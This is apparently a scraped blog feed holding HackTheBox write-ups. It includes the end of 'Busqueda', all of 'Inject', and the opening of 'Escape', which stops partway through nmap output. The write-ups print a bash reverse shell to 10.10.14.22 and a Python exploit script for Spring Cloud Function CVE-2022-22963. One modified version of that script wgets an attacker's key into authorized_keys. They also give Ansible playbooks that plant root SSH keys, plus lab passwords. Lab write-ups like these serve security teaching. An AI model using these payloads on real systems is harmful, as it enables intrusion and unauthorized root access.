.bashrc drwx------ 2 svc svc 4096 Feb 28 11:37 .cache -rw-rw-r-- 1 svc svc 76 Apr 3 08:58 .gitconfig drwx------ 3 svc svc 4096 Apr 22 16:42 .gnupg drwxrwxr-x 5 svc svc 4096 Jun 15 2022 .local lrwxrwxrwx 1 root root 9 Apr 3 08:58 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 svc svc 807 Jan 6 2022 .profile lrwxrwxrwx 1 root root 9 Feb 20 14:08 .searchor-history.json -\u0026gt; /dev/null drwx------ 3 svc svc 4096 Apr 22 16:41 snap -rw-r----- 1 root svc 33 Apr 22 12:28 user.txt bash-5.1$ cat user.txt cat user.txt ef72983276d36e5283938e4b72f9898d Now, using the cody user’s password for performing sudo -l on the machine, we see that\nbash-5.1$ sudo -l sudo -l Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * It seems we can see the [system-checkup.py](http://system-checkup.py) as root user, although we did not have any permissions to read the file./\nIf you request a field which is itself a structure containing other fields, by default you get a Go-style dump of the inner values. Docker adds a template function, json , which can be applied to get results in JSON format. Normally, it provided 3 functionalities, 2 for docker related commands and one for system check\nbash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format=\u0026#39;{{json .Config}}\u0026#39; 960873171e2e \u0026lt;er-inspect --format=\u0026#39;{{json .Config}}\u0026#39; 960873171e2e --format={\u0026#34;Hostname\u0026#34;:\u0026#34;960873171e2e\u0026#34;,\u0026#34;Domainname\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;User\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;AttachStdin\u0026#34;:false,\u0026#34;AttachStdout\u0026#34;:false,\u0026#34;AttachStderr\u0026#34;:false,\u0026#34;ExposedPorts\u0026#34;:{\u0026#34;22/tcp\u0026#34;:{},\u0026#34;3000/tcp\u0026#34;:{}},\u0026#34;Tty\u0026#34;:false,\u0026#34;OpenStdin\u0026#34;:false,\u0026#34;StdinOnce\u0026#34;:false,\u0026#34;Env\u0026#34;:[\u0026#34;USER_UID=115\u0026#34;,\u0026#34;USER_GID=121\u0026#34;,\u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;,\u0026#34;GITEA__database__HOST=db:3306\u0026#34;,\u0026#34;GITEA__database__NAME=gitea\u0026#34;,\u0026#34;GITEA__database__USER=gitea\u0026#34;,\u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;,\u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;,\u0026#34;USER=git\u0026#34;,\u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34;],\u0026#34;Cmd\u0026#34;:[\u0026#34;/bin/s6-svscan\u0026#34;,\u0026#34;/etc/s6\u0026#34;],\u0026#34;Image\u0026#34;:\u0026#34;gitea/gitea:latest\u0026#34;,\u0026#34;Volumes\u0026#34;:{\u0026#34;/data\u0026#34;:{},\u0026#34;/etc/localtime\u0026#34;:{},\u0026#34;/etc/timezone\u0026#34;:{}},\u0026#34;WorkingDir\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Entrypoint\u0026#34;:[\u0026#34;/usr/bin/entrypoint\u0026#34;],\u0026#34;OnBuild\u0026#34;:null,\u0026#34;Labels\u0026#34;:{\u0026#34;com.docker.compose.config-hash\u0026#34;:\u0026#34;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515\u0026#34;,\u0026#34;com.docker.compose.container-number\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;com.docker.compose.oneoff\u0026#34;:\u0026#34;False\u0026#34;,\u0026#34;com.docker.compose.project\u0026#34;:\u0026#34;docker\u0026#34;,\u0026#34;com.docker.compose.project.config_files\u0026#34;:\u0026#34;docker-compose.yml\u0026#34;,\u0026#34;com.docker.compose.project.working_dir\u0026#34;:\u0026#34;/root/scripts/docker\u0026#34;,\u0026#34;com.docker.compose.service\u0026#34;:\u0026#34;server\u0026#34;,\u0026#34;com.docker.compose.version\u0026#34;:\u0026#34;1.29.2\u0026#34;,\u0026#34;maintainer\u0026#34;:\u0026#34;maintainers@gitea.io\u0026#34;,\u0026#34;org.opencontainers.image.created\u0026#34;:\u0026#34;2022-11-24T13:22:00Z\u0026#34;,\u0026#34;org.opencontainers.image.revision\u0026#34;:\u0026#34;9bccc60cf51f3b4070f5506b042a3d9a1442c73d\u0026#34;,\u0026#34;org.opencontainers.image.source\u0026#34;:\u0026#34;https://github.com/go-gitea/gitea.git\u0026#34;,\u0026#34;org.opencontainers.image.url\u0026#34;:\u0026#34;https://github.com/go-gitea/gitea\u0026#34;}} bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format=\u0026#39;{{json .Config}}\u0026#39; f84a6b33fb5a \u0026lt;er-inspect --format=\u0026#39;{{json .Config}}\u0026#39; f84a6b33fb5a --format={\u0026#34;Hostname\u0026#34;:\u0026#34;f84a6b33fb5a\u0026#34;,\u0026#34;Domainname\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;User\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;AttachStdin\u0026#34;:false,\u0026#34;AttachStdout\u0026#34;:false,\u0026#34;AttachStderr\u0026#34;:false,\u0026#34;ExposedPorts\u0026#34;:{\u0026#34;3306/tcp\u0026#34;:{},\u0026#34;33060/tcp\u0026#34;:{}},\u0026#34;Tty\u0026#34;:false,\u0026#34;OpenStdin\u0026#34;:false,\u0026#34;StdinOnce\u0026#34;:false,\u0026#34;Env\u0026#34;:[\u0026#34;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF\u0026#34;,\u0026#34;MYSQL_USER=gitea\u0026#34;,\u0026#34;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh\u0026#34;,\u0026#34;MYSQL_DATABASE=gitea\u0026#34;,\u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;,\u0026#34;GOSU_VERSION=1.14\u0026#34;,\u0026#34;MYSQL_MAJOR=8.0\u0026#34;,\u0026#34;MYSQL_VERSION=8.0.31-1.el8\u0026#34;,\u0026#34;MYSQL_SHELL_VERSION=8.0.31-1.el8\u0026#34;],\u0026#34;Cmd\u0026#34;:[\u0026#34;mysqld\u0026#34;],\u0026#34;Image\u0026#34;:\u0026#34;mysql:8\u0026#34;,\u0026#34;Volumes\u0026#34;:{\u0026#34;/var/lib/mysql\u0026#34;:{}},\u0026#34;WorkingDir\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Entrypoint\u0026#34;:[\u0026#34;docker-entrypoint.sh\u0026#34;],\u0026#34;OnBuild\u0026#34;:null,\u0026#34;Labels\u0026#34;:{\u0026#34;com.docker.compose.config-hash\u0026#34;:\u0026#34;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b\u0026#34;,\u0026#34;com.docker.compose.container-number\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;com.docker.compose.oneoff\u0026#34;:\u0026#34;False\u0026#34;,\u0026#34;com.docker.compose.project\u0026#34;:\u0026#34;docker\u0026#34;,\u0026#34;com.docker.compose.project.config_files\u0026#34;:\u0026#34;docker-compose.yml\u0026#34;,\u0026#34;com.docker.compose.project.working_dir\u0026#34;:\u0026#34;/root/scripts/docker\u0026#34;,\u0026#34;com.docker.compose.service\u0026#34;:\u0026#34;db\u0026#34;,\u0026#34;com.docker.compose.version\u0026#34;:\u0026#34;1.29.2\u0026#34;}} Although from the docker-ps and docker-inspect , we got the information about the running containers, in which there was plaintext password for the database users, trying the same passwords on the gitea.searcher.htb for administrator user\nadministrator:yuiu1hoiu4i5ho1uh Now, we can successfully login to the application as administrator user and a see a repository called scripts\nUpon checking the repository, it contained the [system-checkup.py](http://system-checkup.py) python file which we can analyse to see anything interesting of any sort, what we can see here is, it is using the subprocess to run commands, there was an interesting part in the code which was executing the [full-checkup.sh](http://full-checkup.sh) from the current directory instead of using absolute path for the script, this can be used in our advantage to create a full-checkup.sh in our directory and then run the system-checkup.py as root user which will execute the custom created full-checkup.sh script:\nCreating the [full-checkup.sh](http://full-checkup.sh) with the reverse shell code and giving it the execute permission:\nfull-checkup.sh #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.22/443 0\u0026gt;\u0026amp;1 Now, just execute the command and we got the reverse shell as root:\n","date":"12 August 2023","permalink":"/posts/busqueda-htb/","section":"Posts","summary":"Writeup for HackTheBox Busqueda Machine\nStarting off with the nmap scan, we see that it has HTTP and SSH, as expected.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.","title":"HackTheBox - Busqueda"},{"content":"","date":null,"permalink":"/tags/ansible-playbooks-cronjob-easy-java-seasonal-spring4shell/","section":"Tags","summary":"","title":"Ansible-Playbooks, Cronjob, Easy, Java, Seasonal, Spring4shell"},{"content":"Writeup for HackTheBox\u0026rsquo;s Inject machine.\nWe have an upload functionality in the web app and it accepts PNG files, although there are some bypasses but they didn’t lead anywhere.\nOnce you upload a valid PNG/Image file, you can view it by going to show_image and the filename is specified by the img parameter\nIt is vulnerable to LFI vulnerability, we can access any arbitrary file with the known location.\nAfter some hefty enumeration, we can see the absolute path for the webapp by checking the webapp.service this filename was retrieved from the /opt/automation/tasks/playbook_1.yml during initial enumeration, as giving the a directory location will list out the sub-directories and it’s associated files:\nChecking the service files, we can get the location of the jar file of the webserver.\n[Unit] Description=Spring WEb APP After=syslog.target [Service] User=frank Group=frank ExecStart=/usr/bin/java -Ddebug -jar /var/www/WebApp/target/spring-webapp.jar Restart=always StandardOutput=syslog StandardError=syslog [Install] WantedBy=multi-user.target With the retrieved information, we can get the Spring version by checking pom.xml and it is vulnerable with https://github.com/me2nuk/CVE-2022-22963\nI modified the original script to pass the arguments for better work:\nimport requests import sys import threading import urllib3 urllib3.disable_warnings() def scan(txt,cmd): payload=f\u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;{cmd}\u0026#34;)\u0026#39; data =\u0026#39;test\u0026#39; headers = { \u0026#39;spring.cloud.function.routing-expression\u0026#39;:payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;en\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } path = \u0026#39;/functionRouter\u0026#39; f = open(txt) urllist=f.readlines() for url in urllist : url = url.strip(\u0026#39;\\n\u0026#39;) all = url + path try: req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3) code =req.status_code text = req.text rsp = \u0026#39;\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;\u0026#39; if code == 500 and rsp in text: print ( f\u0026#39;[+] { url } is vulnerable\u0026#39; ) poc_file = open(\u0026#39;vulnerable.txt\u0026#39;, \u0026#39;a+\u0026#39;) poc_file.write(url + \u0026#39;\\n\u0026#39;) poc_file.close() else: print ( f\u0026#39;[-] { url } not vulnerable\u0026#39; ) except requests.exceptions.RequestException: print ( f\u0026#39;[-] { url } detection timed out\u0026#39; ) continue except: print ( f\u0026#39;[-] { url } error\u0026#39; ) continue if __name__ == \u0026#39;__main__\u0026#39; : try: cmd1 =sys.argv[1] cmd2 = sys.argv[2] t = threading . Thread ( target = scan ( cmd1 , cmd2 ) ) t.start() except: print ( \u0026#39;Usage:\u0026#39; ) print(\u0026#39;python poc.py url.txt\u0026#39;) pass For confirmation, doing a ping on my host from the Inject machine, using tcpdump we received ICMP requests.\nAgain, modifying the script to add the public key to the frank user so we can SSH into the machine.\nimport requests import sys import threading import urllib3 urllib3.disable_warnings() def scan(txt,cmd): payload=f\u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;wget http://10.10.14.19/authorized_keys -O /home/frank/.ssh/authorized_keys\u0026#34;)\u0026#39; data =\u0026#39;test\u0026#39; headers = { \u0026#39;spring.cloud.function.routing-expression\u0026#39;:payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;en\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } path = \u0026#39;/functionRouter\u0026#39; f = open(txt) urllist=f.readlines() for url in urllist : url = url.strip(\u0026#39;\\n\u0026#39;) all = url + path try: req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3) code =req.status_code text = req.text rsp = \u0026#39;\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;\u0026#39; if code == 500 and rsp in text: print ( f\u0026#39;[+] { url } is vulnerable\u0026#39; ) poc_file = open(\u0026#39;vulnerable.txt\u0026#39;, \u0026#39;a+\u0026#39;) poc_file.write(url + \u0026#39;\\n\u0026#39;) poc_file.close() else: print ( f\u0026#39;[-] { url } not vulnerable\u0026#39; ) except requests.exceptions.RequestException: print ( f\u0026#39;[-] { url } detection timed out\u0026#39; ) continue except: print ( f\u0026#39;[-] { url } error\u0026#39; ) continue if __name__ == \u0026#39;__main__\u0026#39; : try: cmd1 =sys.argv[1] cmd2 = sys.argv[2] t = threading . Thread ( target = scan ( cmd1 , cmd2 ) ) t.start() except: print ( \u0026#39;Usage:\u0026#39; ) print(\u0026#39;python poc.py url.txt\u0026#39;) pass Confirming the key has been added to the authorized_keys file for the frank user via LFI:\nSuccessfully doing SSH into the machine as frank user:\nFrom the LFI itself, we were able to retrieve the file /home/frank/.m2/settings.xml and paul user password,\n-bash-5.0$ cat .m2/settings.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;settings xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;servers\u0026gt; \u0026lt;server\u0026gt; \u0026lt;id\u0026gt;Inject\u0026lt;/id\u0026gt; \u0026lt;username\u0026gt;phil\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;DocPhillovestoInject123\u0026lt;/password\u0026gt; \u0026lt;privateKey\u0026gt;${user.home}/.ssh/id_dsa\u0026lt;/privateKey\u0026gt; \u0026lt;filePermissions\u0026gt;660\u0026lt;/filePermissions\u0026gt; \u0026lt;directoryPermissions\u0026gt;660\u0026lt;/directoryPermissions\u0026gt; \u0026lt;configuration\u0026gt;\u0026lt;/configuration\u0026gt; \u0026lt;/server\u0026gt; \u0026lt;/servers\u0026gt; \u0026lt;/settings\u0026gt; Using the password, we can change to user paul\nFurther looking into the writable folder and files, we can see that /opt/automation/tasks is writable by staff group member and paul is a member of that group.\nbash-5.0$ find / -writable 2\u0026gt;/dev/null | grep -v proc [..snip..] /tmp/.XIM-unix /tmp/.font-unix /tmp/.X11-unix /tmp/.Test-unix /tmp/.ICE-unix /opt/automation/tasks /etc/systemd/system/nginx.service /etc/systemd/system/sysstat.service /var/tmp /var/crash /var/local /var/lock /home/phil /home/phil/.bashrc /home/phil/.bash_history /home/phil/.cache /home/phil/.cache/motd.legal-displayed /home/phil/.profile /home/phil/.viminfo /home/phil/.vim /home/phil/.vim/.netrwhist /home/frank/.bash_history /usr/lib/systemd/system/screen-cleanup.service /usr/lib/systemd/system/lvm2.service /usr/lib/systemd/system/rcS.service /usr/lib/systemd/system/x11-common.service /usr/lib/systemd/system/cryptdisks.service /usr/lib/systemd/system/multipath-tools-boot.service /usr/lib/systemd/system/hwclock.service /usr/lib/systemd/system/rc.service /usr/lib/systemd/system/sudo.service /usr/lib/systemd/system/cryptdisks-early.service /usr/local/lib/python3.8 /usr/local/lib/python3.8/dist-packages /usr/local/share/fonts That directory had an ansible playbook file for automating tasks\nFrom the enumeration, we were able to anticipate that any tasks created in this directory will be executed, hence to replicate it, I created two tasks,\nThis is for creating an .ssh directory is root home directory\n--- - name: Create directory in root folder hosts: localhost become: yes tasks: - name: Create directory file: path: /root/.ssh state: directory mode: \u0026#39;0755\u0026#39; register: create_result - name: Display create result debug: var: create_result Another is to add the same public key we used for frank user to root user’s authorized_keys\n- name: Copy id_rsa file to /root/.ssh/ hosts: localhost become: yes tasks: - name: Copy id_rsa file copy: src: /home/frank/.ssh/authorized_keys dest: /root/.ssh/authorized_keys mode: \u0026#39;0600\u0026#39; register: copy_result - name: Display copy result debug: var: copy_result Doing so, we were able to login to the target as root\n","date":"8 July 2023","permalink":"/posts/inject-htb/","section":"Posts","summary":"Writeup for HackTheBox\u0026rsquo;s Inject machine.\nWe have an upload functionality in the web app and it accepts PNG files, although there are some bypasses but they didn’t lead anywhere.","title":"HackTheBox - Inject"},{"content":"This machine was medium level windows which involves SQL Server interaction, then using Responder to capture the hash of the sqlsvc user and then enumerating files on the system, from there obtaining password for another user and in the end taking advantage of a vulnerable ADCS Template to gain Administrator access.\nEscape #Starting off with the nmap scan:\n# Nmap 7.92 scan initiated Sat Apr 29 16:23:48 2023 as: nmap -sV -sC -A -Pn -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -o nmap_ports -vv -Pn 10.10.11.202 Nmap scan report for 10.10.11.202 (10.10.11.202) Host is up, received user-set (0.075s latency). Scanned at 2023-04-29 16:23:49 UTC for 88s PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-04-30 00:23:57Z) 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-04-30T00:25:18+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Issuer: commonName=sequel-DC-CA/domainComponent=sequel | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-11-18T21:20:35 | Not valid after: 2023-11-18T21:20:35 | MD5: 869f 7f54 b2ed ff74 708d 1a6d df34 b9bd | SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa | -----BEGIN CERTIFICATE----- | MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF | ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs | MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4 | MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv | mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0 | icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p | Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo | fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl | 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww | LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy | MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw | eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA | MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl | AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7 | lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud | HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj | LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD | Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv | Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50 | MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl | cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049 | U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy | dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5 | MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj | LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+ | /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed | RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC | frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r | nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb | Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ= |_-----END CERTIFICATE----- 445/tcp open microsoft-ds? syn-ack 464/tcp open kpasswd5? syn-ack 593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-04-30T00:25:18+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Issuer: commonName=sequel-DC-CA/domainComponent=sequel | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-11-18T21:20:35 | Not valid after: 2023-11-18T21:20:35 | MD5: 869f 7f54 b2ed ff74 708d 1a6d df34 b9bd | SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa | -----BEGIN CERTIFICATE----- | MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF | ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs | MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4 | MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv | mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0 | icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p | Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo | fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl | 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww | LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy | MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw | eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA | MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl | AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7 | lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud | HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj | LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD | Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv | Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50 | MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl | cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049 | U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy | dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5 | MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj | LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+ | /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed | RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC | frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r | nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb | Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ= |_-----END CERTIFICATE----- 1433/tcp open ms-sql-s syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2023-04-29T14:16:25 | Not valid after: 2053-04-29T14:16:25 | MD5: 86e6 d4f8 e109 b3d4 5984 6875 77b0 16e9 | SHA-1: 8466 a6c0 518b edef ec9b bd6f 9463 c08b 3374 b29e | -----BEGIN CERTIFICATE----- | MIIDADCCAeigAwIBAgIQFR0DCpyAyYVDB6Lf2J/02DANBgkqhkiG9w0BAQsFADA7 | MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA | bABsAGIAYQBjAGswIBcNMjMwNDI5MTQxNjI1WhgPMjA1MzA0MjkxNDE2MjVaMDsx | OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs | AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMPBPDvg | ufJTn2Hc1koyZItXfx7FJKGu9qrc5s+9Du+pd5/kzBr5wEZl84KnV8ocDPpxmoNP | mI8IKUCp8h33LLciOypjEN4qOuICRuDJDJM62RYsMO4Rivc2qGVYo2mzGXE14/VD | SCYkK8Q+j+JhUzZX7nA4pnEco/l/LvkvNpgWqA2KieCN+WWg4dW4xYlUl1eBJ1fh | Zm5l+PhBTWGLTLimnP0maugREGLnmxlQdpE0oMPp3v41yZzJn+GMPBeU26X+trMS | 